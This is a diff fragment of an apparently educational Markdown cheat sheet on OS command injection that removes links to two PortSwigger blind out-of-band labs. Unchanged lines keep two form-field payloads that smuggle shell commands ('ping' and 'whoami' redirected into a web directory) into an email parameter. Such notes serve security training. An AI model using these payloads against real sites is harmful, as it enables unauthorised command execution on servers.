@@ -54,14 +54,6 @@ name=dede&email=test%40gmail.com||+ping+-c+10+127.0.0.1+||&subject=dede&message=
 name=test&email=||whoami>/var/www/images/output.txt||&subject=test&message=test
 ```
 
- **Blind OS command injection with out-of-band interaction**
- 
- Lab :https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
-
- **Blind OS command injection with out-of-band data exfiltration**
-
-Lab : https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration
-
 ### RCE - Exfiltrating via DNS
 
 ```
